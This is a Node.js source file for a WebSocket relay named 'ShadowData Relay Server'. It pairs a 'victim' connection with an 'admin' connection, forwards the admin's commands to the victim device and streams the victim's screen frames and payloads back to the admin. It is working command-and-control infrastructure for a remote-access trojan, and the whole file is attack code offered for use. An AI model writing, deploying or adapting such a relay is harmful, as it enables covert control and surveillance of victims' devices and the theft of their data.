const express = require('express');
const { WebSocketServer, WebSocket } = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server });

let victimSocket = null;
let adminSocket = null;

app.get('/', (req, res) => {
    res.send(`ShadowData Relay Server Active.<br>Victim Connected: ${!!victimSocket}<br>Admin Connected: ${!!adminSocket}`);
});

wss.on('connection', (ws, req) => {
    const urlParams = new URLSearchParams(req.url.split('?')[1]);
    const role = urlParams.get('role');

    if (role === 'victim') {
        victimSocket = ws;
        console.log('>>> Victim connected successfully.');
    } else if (role === 'admin') {
        adminSocket = ws;
        console.log('>>> Admin connected successfully.');
    }

    ws.on('message', (message) => {
        const isBinary = Buffer.isBuffer(message);
        const logContent = isBinary ? `[Binary/Frame Buffer: ${message.length} bytes]` : message.toString();
        console.log(`Received message from [${role}]: ${logContent.substring(0, 100)}...`);

        if (role === 'admin') {
            if (victimSocket && victimSocket.readyState === WebSocket.OPEN) {
                victimSocket.send(message);
                console.log('-> Successfully forwarded command to Victim.');
            } else {
                console.log('-> ROUTING FAILED: Victim socket is null or not OPEN.');
                if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                    adminSocket.send(JSON.stringify({ error: "Victim device is offline or disconnected." }));
                }
            }
        } else if (role === 'victim') {
            if (adminSocket && adminSocket.readyState === WebSocket.OPEN) {
                adminSocket.send(message);
                console.log('-> Successfully forwarded screen frame/payload to Admin.');
            } else {
                console.log('-> ROUTING FAILED: Admin socket is null or not OPEN.');
            }
        }
    });

    ws.on('close', () => {
        if (ws === victimSocket) {
            victimSocket = null;
            console.log('XXX Victim disconnected.');
        }
        if (ws === adminSocket) {
            adminSocket = null;
            console.log('XXX Admin disconnected.');
        }
    });
});

const PORT = process.env.PORT || 10000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server listening on port ${PORT}`);
});
